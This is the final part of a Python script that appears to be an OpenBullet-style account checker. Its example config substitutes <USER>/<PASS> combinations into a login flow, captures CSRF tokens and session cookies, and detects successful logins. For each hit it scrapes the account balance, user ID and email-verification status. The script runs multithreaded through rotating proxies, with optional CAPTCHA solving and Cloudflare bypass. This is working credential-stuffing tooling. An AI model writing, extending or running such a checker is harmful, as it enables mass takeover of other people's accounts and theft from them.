        return
    
    if args.proxies:
        ob.proxy_manager.load_proxies(args.proxies)
    
    try:
        ob.run()
    except KeyboardInterrupt:
        ColorLogger.warning("Interrupted by user")
    except Exception as e:
        ColorLogger.error(f"Fatal error: {e}")


def create_advanced_config():
    """Create advanced config example"""
    config = {
        "mode": "login",
        "request_steps": [
            {
                "name": "get_login_page",
                "url": "https://example.com/login",
                "method": "GET",
                "capture_regex": {
                    "csrf_token": r'name="csrf_token" value="([^"]+)"',
                    "session_id": r'PHPSESSID=([^;]+)'
                },
                "required": True,
                "delay_after": 1.0
            },
            {
                "name": "submit_login",
                "url": "https://example.com/login",
                "method": "POST",
                "data": "username=<USER>&password=<PASS>&csrf_token=<CSRF_TOKEN>",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://example.com/login"
                },
                "success_strings": ["dashboard", "welcome"],
                "failure_strings": ["invalid", "error"],
                "required": True,
                "delay_after": 2.0
            },
            {
                "name": "get_balance",
                "url": "https://example.com/dashboard",
                "method": "GET",
                "capture_regex": {
                    "balance": r'Balance:\s*\$?([0-9,.]+)',
                    "user_id": r'user_id["\s]*[:\s]*["\']?(\d+)',
                    "email_verified": r'"email_verified":\s*(true|false)'
                },
                "required": False,
                "delay_after": 0.5
            }
        ],
        "captcha": {
            "enabled": False,
            "solver": "manual",
            "api_key": "your_2captcha_api_key_here"
        },
        "cloudflare": {
            "enabled": False
        },
        "settings": {
            "threads": 15,
            "timeout": 30,
            "delay": 0.2,
            "retries": 3
        }
    }
    
    with open('config_advanced_example.json', 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)
    
    ColorLogger.success("Advanced config created: config_advanced_example.json")


if __name__ == "__main__":
    main()